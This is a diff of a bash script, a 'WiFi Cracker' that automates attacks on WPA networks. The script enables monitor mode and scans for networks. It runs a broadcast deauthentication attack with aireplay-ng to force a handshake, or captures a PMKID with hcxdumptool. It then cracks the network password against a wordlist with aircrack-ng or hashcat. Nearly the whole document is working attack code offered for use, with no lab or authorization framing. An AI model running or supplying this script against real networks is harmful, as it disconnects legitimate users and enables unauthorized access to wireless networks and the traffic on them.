@@ -1,326 +1,368 @@
 #!/bin/bash
-tput civis
+tput civis 2>/dev/null
 trap 'tput cnorm 2>/dev/null' EXIT INT TERM
 clear
-echo""
 
-# Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-WHITE='\033[1;37m'
+R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
+B='\033[0;34m'; P='\033[0;35m'; C='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
 
-# Format
-BOLD='\033[1m'
-NC='\033[0m'
+info() { echo -e "${BOLD}${B}  [*] $*${NC}"; }
+ok()   { echo -e "${BOLD}${G}  [+] $*${NC}"; }
+warn() { echo -e "${BOLD}${Y}  [!] $*${NC}"; }
+bad()  { echo -e "${BOLD}${R}  [-] $*${NC}"; echo ""; exit 1; }
+ask()  { tput cnorm 2>/dev/null; echo -ne "${BOLD}${P}  [?] $*${NC}"; }
+sep()  { echo -e "\n${BOLD}${C}  ── $* ──${NC}\n"; }
 
-function show_banner {
-  echo -e "${BOLD}${CYAN}MCWFCRK — Marco Calvo WiFi Cracker${NC}"
+install_package() {
+  local package="$1"
+  info "Installing $package"
+  if command -v apt-get >/dev/null 2>&1; then
+    if sudo apt-get update -qq >/dev/null 2>&1 \
+      && sudo apt-get install -qq -y "$package" >/dev/null 2>&1; then
+      ok "$package installed"
+      return 0
+    fi
+  fi
+  bad "Failed to install $package"
+}
+
+monitor_iface=""
+raw_iface=""
+monitor_activated=0
+wordlist=""
+attack_mode="HANDSHAKE"
+output_path=""
+pmkid_timeout=45
+bssid=""
+channel=""
+ts=$(date +%s)
+_cleaned=0
+
+cleanup() {
+  [[ $_cleaned -eq 1 ]] && return
+  _cleaned=1
+  tput cnorm 2>/dev/null
   echo ""
-}
-
-show_banner
-
-# ---States---------------------------------------
-function info { 
-  echo -e "${BOLD}${BLUE}[*] $1 ${NC}"
-}
-
-function success {
-  echo -e "${BOLD}${GREEN}[+] $1 ${NC}"
-}
-
-function error {
-  echo -e "${BOLD}${RED}[-] $1 ${NC}"
-  echo ""
-  exit 1
-}
-
-function warning {
-  echo -e "${BOLD}${YELLOW}[!] $1 ${NC}"
-}
-
-function ask {
-  tput cnorm
-  echo -ne "${BOLD}${PURPLE}[?] $1 ${NC}"
-}
-
-# ---Cleanup---------------------------------------
-function cleanup_process {
-  if [[ -z "$monitor_interface" ]] && [[ -z "$(ls /tmp/captura_*.cap 2>/dev/null)" ]]; then
-    return
-  fi
-
-  info "Cleaning up resources..."
-
-  if [[ -n "$monitor_interface" ]]; then
-    info "Deactivating monitor mode on $monitor_interface..."
-    sudo airmon-ng stop "$monitor_interface" >/dev/null 2>&1
-    sleep 1
-    success "Monitor mode deactivated."
-  fi
-
-  if [[ -n "$(ls /tmp/captura_*.cap 2>/dev/null)" ]]; then
-    info "Removing temporary capture files..."
-    rm -f /tmp/captura_*.cap 2>/dev/null
-    rm -f /tmp/captura_*.csv 2>/dev/null
-    success "Cleanup completed."
-  fi
+  sep "Cleanup"
 
   pkill -f "xterm.*airodump" 2>/dev/null
   pkill -f "xterm.*aireplay" 2>/dev/null
   pkill -f "xterm.*aircrack" 2>/dev/null
+  pkill -f "xterm.*hcxdumptool" 2>/dev/null
+  pkill -f "xterm.*hashcat" 2>/dev/null
+  sudo pkill -x aireplay-ng 2>/dev/null
+  sudo pkill -x airodump-ng 2>/dev/null
+  sudo pkill -x hcxdumptool 2>/dev/null
+  sleep 1
+
+  if [[ $monitor_activated -eq 1 && -n "$monitor_iface" ]]; then
+    info "Deactivating monitor mode on $monitor_iface"
+    sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
+    ok "Monitor mode deactivated"
+  fi
+
+  if [[ -z "$output_path" ]]; then
+    rm -f /tmp/mcwf_*.cap /tmp/mcwf_*.csv /tmp/mcwf_*.netxml \
+          /tmp/mcwf_*.pcapng /tmp/mcwf_*.hc22000 /tmp/mcwf_*.pot \
+          /tmp/mcwf_*.key /tmp/mcwf_check_*.hc22000 2>/dev/null
+    ok "Temporary files removed"
+  fi
+  echo ""
 }
 
+trap 'cleanup; exit' EXIT
+trap 'bad "Process interrupted"' INT TERM
 
-# ---Help---------------------------------------
-function help_menu {
-  ask "Try: bash $0 -w /path/to/your/wordlist"
-  echo ""
-  echo ""
-}
-
-
-# ---Args---------------------------------------
 while [[ $# -gt 0 ]]; do
   case "$1" in
-
     -w|--wordlist)
-      wordlist="$2"
-      shift 2
-      ;;
-
+      wordlist="$2"; shift 2 ;;
+    -a|--attack-mode)
+      attack_mode="${2^^}"; shift 2 ;;
+    -o|--output)
+      output_path="$2"; shift 2 ;;
+    -t|--timeout)
+      [[ -z "${2:-}" ]] && bad "-t requires a value in seconds"
+      pmkid_timeout="$2"; shift 2 ;;
     -h|--help)
-      help_menu
-      exit 0
-      ;;
-
+      echo -e "${P}  Usage: sudo $0 -w <wordlist> [-a HANDSHAKE|PMKID] [-t <seconds>] [-o <outdir>]${NC}"
+      exit 0 ;;
     *)
-      error "Invalid option: $1"
-      ;;
+      bad "Invalid option: $1" ;;
   esac
 done
 
-if [[ -z "$wordlist" ]]; then
-  error "You must to proportionate a wordlist, use -w or --wordlist"
-  exit 1
+[[ -n "$wordlist" ]] || bad "Wordlist required. Use -w or --wordlist"
+[[ -f "$wordlist" ]] || bad "Wordlist not found: $wordlist"
+[[ "$attack_mode" == "HANDSHAKE" || "$attack_mode" == "PMKID" ]] \
+  || bad "Attack mode must be HANDSHAKE or PMKID"
+[[ "$pmkid_timeout" =~ ^[0-9]+$ && $pmkid_timeout -ge 1 ]] \
+  || bad "Timeout must be a positive number of seconds"
+
+echo -e "\n${BOLD}${C}  MCWFCRK — Marco Calvo WiFi Cracker${NC}"
+if [[ "$attack_mode" == "PMKID" ]]; then
+  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Timeout: ${pmkid_timeout}s${NC}\n"
+else
+  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")${NC}\n"
 fi
 
-# ---Instalation---------------------------------------
-function install_package {
-  local package="$1"
-  info "Installing $package..."
+sep "Environment"
 
-  if command -v apt-get >/dev/null 2>&1; then
-    if sudo apt-get update -qq >/dev/null 2>&1 && sudo apt-get install -qq -y "$package" >/dev/null 2>&1; then
-      success "$package installed successfully."
-      return 0
-    fi
-  fi
+if [[ $EUID -eq 0 ]] || sudo -v -n >/dev/null 2>&1; then
+  ok "Privileges OK"
+else
+  bad "Run as root or with sudo"
+fi
 
-  error "Failed to install $package."
-}
-
-function install_tools {
+if command -v airmon-ng airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; then
+  ok "Aircrack-ng suite OK"
+else
+  warn "Aircrack-ng suite not found"
   install_package aircrack-ng
-}
+  ok "Aircrack-ng suite OK"
+fi
 
-function install_xterm {
+if command -v xterm >/dev/null 2>&1; then
+  ok "xterm OK"
+else
+  warn "xterm not found"
   install_package xterm
-}
+  ok "xterm OK"
+fi
 
-# ---Checks---------------------------------------
-function check_sudo {
-  if [ "$EUID" -eq 0 ]; then
-    success "Running as root."
-    return 0
-  elif sudo -v -n >/dev/null 2>&1; then
-    success "Sudo credentials cached."
-    return 0
-  else
-    error "This script must be run as root or with sudo privileges."
-  fi
-}
+if [[ "$attack_mode" == "PMKID" ]]; then
+  command -v hcxdumptool >/dev/null 2>&1 || { warn "hcxdumptool not found"; install_package hcxdumptool; }
+  command -v hcxpcapngtool >/dev/null 2>&1 || { warn "hcxpcapngtool not found"; install_package hcxtools; }
+  command -v hashcat >/dev/null 2>&1 || { warn "hashcat not found"; install_package hashcat; }
+  command -v tcpdump >/dev/null 2>&1 || { warn "tcpdump not found"; install_package tcpdump; }
+  ok "PMKID tools OK"
+fi
 
-function check_tools {
-  if command -v airmon-ng airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; then
-    success "Aircrack suite is installed."
-  else
-    warning "Aircrack suite not found."
-    install_tools
-  fi
+sep "Monitor Interface"
 
-  if command -v xterm >/dev/null 2>&1; then
-    success "xterm is installed."
-  else
-    warning "xterm not found."
-    install_xterm
-  fi
-}
+for f in /sys/class/net/*/type; do
+  [[ "$(cat "$f" 2>/dev/null)" == "803" ]] && {
+    monitor_iface=$(basename "$(dirname "$f")")
+    ok "Using existing monitor interface: $monitor_iface"
+    break
+  }
+done
 
-function check_wordlist {
-  if [[ -f "$wordlist" ]]; then
-    success "Wordlist found at: $wordlist"
-  else
-    error "Wordlist not found: $wordlist"
-  fi
-}
-
-# ---Interface Selection---------------------------------------
-function activate_monitor_mode {
-  info "Checking for available interfaces in monitor mode..."
-  
-  existing_monitor=$(sudo airmon-ng 2>/dev/null | grep -i "monitor" | awk '{print $1}' | head -1)
-  
-  if [[ -n "$existing_monitor" ]]; then
-    success "Found existing monitor interface: $existing_monitor"
-    monitor_interface="$existing_monitor"
-    return
-  fi
-  
-  warning "No monitor interface found. Displaying available interfaces:"
+if [[ -z "$monitor_iface" ]]; then
+  warn "No monitor interface found"
   echo ""
   sudo airmon-ng
   echo ""
-  
-  ask "Enter the interface name to activate monitor mode (e.g., wlan0): "
-  read -r interface
-  
-  if [[ -z "$interface" ]]; then
-    error "No interface provided."
-  fi
-  
-  info "Activating monitor mode on $interface..."
-  
-  if sudo airmon-ng start "$interface" >/dev/null 2>&1; then
-    sleep 2
-    monitor_interface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
-    if [[ -z "$monitor_interface" ]]; then
-      monitor_interface="${interface}mon"
-    fi
-    success "Monitor mode activated: $monitor_interface"
-  else
-    error "Failed to activate monitor mode."
-  fi
+  ask "Enter interface to activate monitor mode: "
+  read -r raw_iface
+  [[ -n "$raw_iface" ]] || bad "No interface provided"
+
+  info "Activating monitor mode on $raw_iface"
+  sudo airmon-ng start "$raw_iface" >/dev/null 2>&1 \
+    || bad "Failed to activate monitor mode on $raw_iface"
+  sleep 2
+
+  monitor_iface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
+  [[ -n "$monitor_iface" ]] || monitor_iface="${raw_iface}mon"
+  monitor_activated=1
+  ok "Monitor mode activated: $monitor_iface"
+fi
+
+raw_iface="${raw_iface:-$monitor_iface}"
+raw_iface="${raw_iface%mon}"
+
+close_scan() {
+  [[ -n "${scan_pid:-}" ]] && kill "$scan_pid" 2>/dev/null && wait "$scan_pid" 2>/dev/null
+  sudo pkill -f "airodump-ng ${monitor_iface} --band bga" 2>/dev/null
 }
 
-# ---Target Selection---------------------------------------
-function close_scan_window {
-  if [[ -n "$scan_pid" ]]; then
-    kill "$scan_pid" 2>/dev/null
-    wait "$scan_pid" 2>/dev/null
-  fi
-  sudo pkill -f "airodump-ng ${monitor_interface} --band bga" 2>/dev/null
-}
+sep "Target"
 
-function select_target {
-  info "Scanning for wireless networks on $monitor_interface..."
-  echo ""
+info "Opening network scan window on $monitor_iface"
+xterm -geometry 100x30 -fn 9x15 -title "Network Scan" \
+  -e "sudo airodump-ng $monitor_iface --band bga" &
+scan_pid=$!
+sleep 1
+echo ""
 
-  sleep 1
-  xterm -geometry 100x30 -fn "9x15" -title "Network Scan" -e "sudo airodump-ng $monitor_interface --band bga" &
-  scan_pid=$!
+ask "Enter the BSSID of the target network: "
+read -r bssid
+[[ -n "$bssid" ]] || bad "BSSID is required"
+bssid="${bssid^^}"
+[[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || bad "Invalid BSSID format"
 
-  echo ""
-  ask "Enter the BSSID (MAC address) of the target network: "
-  read -r bssid
+ask "Enter the channel of the target network: "
+read -r channel
+[[ "$channel" =~ ^[0-9]+$ && $channel -ge 1 && $channel -le 233 ]] || bad "Invalid channel"
 
-  if [[ -z "$bssid" ]]; then
-    error "BSSID is required."
-  fi
+close_scan
+ok "Target selected: BSSID $bssid on channel $channel"
 
-  ask "Enter the channel of the target network: "
-  read -r channel
+if [[ -n "$output_path" ]]; then
+  mkdir -p "$output_path" || bad "Cannot create output directory: $output_path"
+  cap_base="${output_path}/mcwf_${ts}"
+else
+  cap_base="/tmp/mcwf_${ts}"
+fi
 
-  if [[ -z "$channel" ]]; then
-    error "Channel is required."
-  fi
+attack_handshake() {
+  sep "Handshake Capture"
+  local capfile="${cap_base}-01.cap"
 
-  success "Target selected - BSSID: $bssid, Channel: $channel"
-  close_scan_window
-}
-
-# ---Packet Capture---------------------------------------
-function capture_packets {
-  info "Starting packet capture and deauthentication attack..."
-  echo ""
-
-  capture_dir="/tmp"
-  capture_file="$capture_dir/captura_$(date +%s)"
-
-  info "Opening packet capture window..."
-  xterm -geometry 100x30 -fn "9x15" -title "Packet Capture" -e "sudo airodump-ng $monitor_interface -c $channel --bssid $bssid -w $capture_file" &
-  capture_pid=$!
-
+  info "Opening packet capture window"
+  xterm -geometry 100x30 -fn 9x15 -title "Packet Capture" \
+    -e "sudo airodump-ng $monitor_iface -c $channel --bssid $bssid -w $cap_base" &
+  local cap_pid=$!
   sleep 3
 
-  info "Opening deauthentication window..."
-  xterm -geometry 100x30 -fn "9x15" -title "Deauthentication Attack" -hold -e "sudo aireplay-ng -0 5 -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_interface" &
-  deauth_pid=$!
+  info "Opening deauthentication window"
+  xterm -geometry 100x30 -fn 9x15 -title "Deauthentication Attack" -hold \
+    -e "sudo aireplay-ng -0 5 -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_iface" &
+  local deauth_pid=$!
 
   for ((i=0; i<20; i++)); do
     sudo pgrep -x aireplay-ng >/dev/null 2>&1 && break
     sleep 0.5
   done
-
   while sudo pgrep -x aireplay-ng >/dev/null 2>&1; do
     sleep 1
   done
 
   sleep 3
-
   kill "$deauth_pid" 2>/dev/null
   wait "$deauth_pid" 2>/dev/null
+  sleep 2
+  kill "$cap_pid" 2>/dev/null
+  sudo pkill -f "airodump-ng ${monitor_iface} -c ${channel} --bssid ${bssid}" 2>/dev/null
+  wait "$cap_pid" 2>/dev/null
 
-  sleep 3
+  [[ -f "$capfile" ]] || bad "Capture file not found"
 
-  kill "$capture_pid" 2>/dev/null
-  sudo pkill -f "airodump-ng ${monitor_interface} -c ${channel} --bssid ${bssid}" 2>/dev/null
-  wait "$capture_pid" 2>/dev/null
+  info "Verifying handshake in capture file"
+  sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[0-9]+ handshake" \
+    && ok "Handshake captured: $capfile" \
+    || bad "No handshake found. Retry with a connected client on the target AP"
 
-  capture_file_full=$(ls -t "$capture_dir"/captura_*-01.cap 2>/dev/null | head -n1)
-  
-  if [[ -n "$capture_file_full" ]]; then
-    success "Packet capture completed: $capture_file_full"
+  sep "Cracking"
+  local keyfile="${cap_base}.key"
+  info "Opening aircrack-ng window"
+  xterm -geometry 100x40 -fn 9x15 -title "Aircrack-ng" \
+    -e "bash -c 'sudo aircrack-ng -w \"$wordlist\" -b $bssid -l \"$keyfile\" \"$capfile\"; echo; sleep 3'" &
+  local aircrack_xterm_pid=$!
+  wait "$aircrack_xterm_pid"
+
+  if [[ -f "$keyfile" && -s "$keyfile" ]]; then
+    local pw
+    pw=$(tr -d '\n' < "$keyfile")
+    ok "Password cracked: $pw"
   else
-    error "Packet capture file not found."
+    bad "Password not found in wordlist"
   fi
 }
 
-# ---Crack Password---------------------------------------
-function crack_password {
-  info "Starting password cracking process..."
-  echo ""
-  
-  capture_file=$(ls -t /tmp/captura_*-01.cap 2>/dev/null | head -n1)
-  
-  if [[ -z "$capture_file" ]]; then
-    error "No capture file found."
+pmkid_channel() {
+  if [[ "$1" -le 14 ]]; then
+    echo "${1}a"
+  else
+    echo "${1}b"
   fi
-  
-  success "Using capture file: $capture_file"
-  success "Using wordlist: $wordlist"
-  echo ""
-  
+}
+
+create_pmkid_bpf() {
+  local iface="$1" outfile="$2" mac="$3"
+  local filter="wlan addr1 $mac or wlan addr2 $mac or wlan addr3 $mac or wlan addr3 ff:ff:ff:ff:ff:ff"
+
+  sudo tcpdump -i "$iface" -ddd "$filter" > "$outfile" 2>/dev/null \
+    && return 0
+  sudo tcpdump -i "$iface" -y IEEE802_11 -ddd "$filter" > "$outfile" 2>/dev/null \
+    && return 0
+  sudo tcpdump -i "$iface" -y IEEE802_11_RADIO -ddd "$filter" > "$outfile" 2>/dev/null \
+    && return 0
+  return 1
+}
+
+pmkid_captured() {
+  local cap="$1" check="/tmp/mcwf_check_${ts}.hc22000"
+  [[ -f "$cap" ]] || return 1
+  hcxpcapngtool "$cap" -o "$check" >/dev/null 2>&1 || return 1
+  grep -qE '^WPA\*' "$check" 2>/dev/null
+}
+
+attack_pmkid() {
+  sep "PMKID Capture"
+  local pmkid_file="${cap_base}.pcapng"
+  local hash_file="${cap_base}.hc22000"
+  local bpf="/tmp/mcwf_bpf_${ts}.txt"
+  local ch_band tot=$(( (pmkid_timeout + 59) / 60 ))
+  local phy_iface="$raw_iface"
+
+  info "Creating BPF filter for BSSID $bssid"
+  create_pmkid_bpf "$monitor_iface" "$bpf" "$bssid" \
+    || bad "Failed to create BPF filter on interface $monitor_iface"
+
+  info "Stopping airmon-ng monitor on $monitor_iface for hcxdumptool"
+  sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
   sleep 1
-  xterm -geometry 100x40 -fn "9x15" -title "Aircrack-ng - WiFi Password Cracker" -hold -e "sudo aircrack-ng -w $wordlist -b $bssid $capture_file"
+  sudo ip link set "$phy_iface" up 2>/dev/null
+
+  ch_band=$(pmkid_channel "$channel")
+
+  info "Opening PMKID capture window on channel $ch_band"
+  xterm -geometry 100x30 -fn 9x15 -title "PMKID Capture" -hold \
+    -e "sudo hcxdumptool -i $phy_iface -w $pmkid_file -c $ch_band --bpf=$bpf --tot=$tot" &
+  local pmkid_pid=$!
+  sleep 2
+
+  sudo pgrep -x hcxdumptool >/dev/null 2>&1 \
+    || bad "hcxdumptool did not start. Check the PMKID Capture window for errors"
+
+  for ((t=pmkid_timeout; t>0; t--)); do
+    sudo pgrep -x hcxdumptool >/dev/null 2>&1 || break
+    if pmkid_captured "$pmkid_file"; then
+      ok "PMKID captured"
+      sleep 3
+      break
+    fi
+    printf "\r  ${BOLD}${B}[*] PMKID capture: ${t}s${NC}   "
+    sleep 1
+  done
+  echo ""
+
+  kill "$pmkid_pid" 2>/dev/null
+  wait "$pmkid_pid" 2>/dev/null
+  sudo pkill -x hcxdumptool 2>/dev/null
+  rm -f "$bpf" "/tmp/mcwf_check_${ts}.hc22000"
+
+  [[ -f "$pmkid_file" ]] || bad "PMKID capture file not found"
+
+  info "Converting capture to hc22000 hash"
+  hcxpcapngtool "$pmkid_file" -o "$hash_file" >/dev/null 2>&1 \
+    || bad "hcxpcapngtool conversion failed"
+  grep -qE '^WPA\*' "$hash_file" \
+    || bad "No PMKID hash found for this AP"
+
+  ok "Hash file ready: $hash_file"
+
+  sep "Cracking"
+  local potfile="${cap_base}.pot"
+  info "Opening hashcat window"
+  xterm -geometry 100x40 -fn 9x15 -title "Hashcat PMKID" \
+    -e "bash -c 'hashcat -m 22000 --force --potfile-path \"$potfile\" \"$hash_file\" \"$wordlist\"; echo; echo --- Result ---; hashcat -m 22000 --potfile-path \"$potfile\" --show \"$hash_file\"; echo; sleep 3'" &
+  local hashcat_xterm_pid=$!
+  wait "$hashcat_xterm_pid"
+
+  local pw
+  pw=$(hashcat -m 22000 --potfile-path "$potfile" --show "$hash_file" 2>/dev/null \
+    | awk -F: '{print $NF}')
+  if [[ -n "$pw" ]]; then
+    ok "Password cracked: $pw"
+  else
+    bad "Password not found in wordlist"
+  fi
 }
 
-# ---Main---------------------------------------
-check_sudo
-check_tools
-check_wordlist
+[[ "$attack_mode" == "PMKID" ]] && attack_pmkid || attack_handshake
 
-trap 'tput cnorm 2>/dev/null; cleanup_process; exit' EXIT INT TERM
-
-activate_monitor_mode
-select_target
-capture_packets
-crack_password
-
-tput cnorm
-success "Process completed. Exiting..."
+tput cnorm 2>/dev/null
+ok "Process completed"
 exit 0
